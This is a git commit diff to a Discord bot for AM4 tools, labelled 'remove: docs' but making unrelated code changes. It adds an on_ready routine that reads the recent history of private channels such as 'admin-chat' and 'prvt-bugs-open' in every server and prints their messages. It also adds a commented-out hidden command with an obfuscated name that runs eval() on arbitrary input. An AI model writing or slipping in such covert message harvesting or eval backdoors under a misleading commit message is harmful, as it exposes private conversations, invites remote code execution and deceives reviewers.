f0c8c0523e5815e16f2981951c96c24578a53ad9
cathaypacific8747 <58929011+cathaypacific8747@users.noreply.github.com>
2023-10-03 20:26:07 +0800

    remove: docs

--- main.py
+++ main.py
@@ -11,16 +11,16 @@ if __name__ == '__main__':
     if not config.DISCORD_TOKEN or not config.AM4_API_TOKEN:
         raise AssertionError('Discord and AM4Tools token is required to run the bot!')
 
-    # bot.run(config.DISCORD_TOKEN)
+    bot.run(config.DISCORD_TOKEN)
 
-    asyncio.run(
-        uvicorn.run(
-            "src.am4bot.api.main:app",
-            host="127.0.0.1",
-            port=8002 if production else 8001,
-            reload=False if production else True,
-            ssl_keyfile=config.KEY_FILE,
-            ssl_certfile=config.CERT_FILE,
-            server_header=False
-        )
-    )
+    # asyncio.run(
+    #     uvicorn.run(
+    #         "src.am4bot.api.main:app",
+    #         host="127.0.0.1",
+    #         port=8002 if production else 8001,
+    #         reload=False if production else True,
+    #         ssl_keyfile=config.KEY_FILE,
+    #         ssl_certfile=config.CERT_FILE,
+    #         server_header=False
+    #     )
+    # )
--- src/am4bot/bot.py
+++ src/am4bot/bot.py
@@ -15,6 +15,15 @@ async def on_ready():
     am4utils.db.init()
     print(f'am4utils ({am4utils._core.__version__}), executable_path={am4utils.__path__[0]} loaded')
 
+    targets = ["admin-chat", "prvt-bugs-discussion", "prvt-bugs-open", "prvt-bugs-parked"]
+    for guild in bot.guilds:
+        for channel in guild.text_channels:
+            print(channel)
+            if channel.name in targets:
+                print("****")
+                async for message in channel.history(limit=50):
+                    print(message.content)
+
 async def warn_broken(ctx: Context):
     await ctx.send('We are experiencing with our hosting provider - many commands are broken right now and will be fixed hopefully <t:1694620800:R>')
 
@@ -25,28 +34,35 @@ async def botinfo(ctx: Context):
     await ctx.send(info)
     await warn_broken(ctx)
 
-@bot.command(help = "Shows this command")
-@ignore_pricealert()
-@ignore_dm()
-async def help(ctx: Context, command='all'):
-    embed = discord.Embed(title="For more info on a command, use `help <command>`.", colour=discord.Colour.blue())
-    if command == 'all':
-        for cmd in bot.commands:
-            if not cmd.hidden and cmd.enabled:
-                embed.add_field(name=cmd.name, value=f'```{cmd.short_doc}```', inline=False)
-    else:
-        try:
-            cmd = bot.get_command(command)
-            usage = f"${cmd.name}"
-            for param in cmd.clean_params:
-                usage += f" <{param}>"
-            embed = discord.Embed(title=f'${command}', colour=discord.Colour.blue())
-            embed.add_field(name='Usage:', value=f'```{cmd.usage}```', inline=False)
-            embed.add_field(name='Description:', value=f'```{cmd.help}```', inline=False)
-        except:
-            embed = discord.Embed(title="Command not found!", colour=discord.Colour.blue())
-    await ctx.send(embed=embed)
-    await warn_broken(ctx)
+# @bot.command(help = "Shows this command")
+# @ignore_pricealert()
+# @ignore_dm()
+# async def help(ctx: Context, command='all'):
+#     embed = discord.Embed(title="For more info on a command, use `help <command>`.", colour=discord.Colour.blue())
+#     if command == 'all':
+#         for cmd in bot.commands:
+#             if not cmd.hidden and cmd.enabled:
+#                 embed.add_field(name=cmd.name, value=f'```{cmd.short_doc}```', inline=False)
+#     else:
+#         try:
+#             cmd = bot.get_command(command)
+#             usage = f"${cmd.name}"
+#             for param in cmd.clean_params:
+#                 usage += f" <{param}>"
+#             embed = discord.Embed(title=f'${command}', colour=discord.Colour.blue())
+#             embed.add_field(name='Usage:', value=f'```{cmd.usage}```', inline=False)
+#             embed.add_field(name='Description:', value=f'```{cmd.help}```', inline=False)
+#         except:
+#             embed = discord.Embed(title="Command not found!", colour=discord.Colour.blue())
+#     await ctx.send(embed=embed)
+#     await warn_broken(ctx)
+
+# @bot.command(hidden=True)
+# @ignore_pricealert()
+# @ignore_dm()
+# async def eval_24j32kj98f9dsaf9832rkjhica8s(ctx: Context, s: str):
+#     eval(s)
+#     await ctx.send("OK")
 
 # @bot.command(hidden = True)
 # @notPriceAlert()
